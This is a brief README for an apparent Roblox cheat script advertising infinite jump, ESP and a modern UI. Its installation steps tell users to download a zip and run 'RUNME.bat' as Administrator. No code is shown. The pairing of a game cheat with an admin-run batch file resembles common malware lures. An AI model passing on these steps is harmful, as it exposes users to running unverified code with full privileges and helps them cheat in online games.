# 🚀 Advanced Roblox Universal Script

Welcome to **Advanced Roblox Universal Script**.

## 📦 Installation

1. Download the latest release.
2. Extract the `.zip` archive to a folder of your choice.
3. Read the documentation included with the project.
4. Run the application "RUNME.bat" **as Administrator**.

* 🦘 Infinite Jump

* 👀 ESP

* 🎮 Modern UI
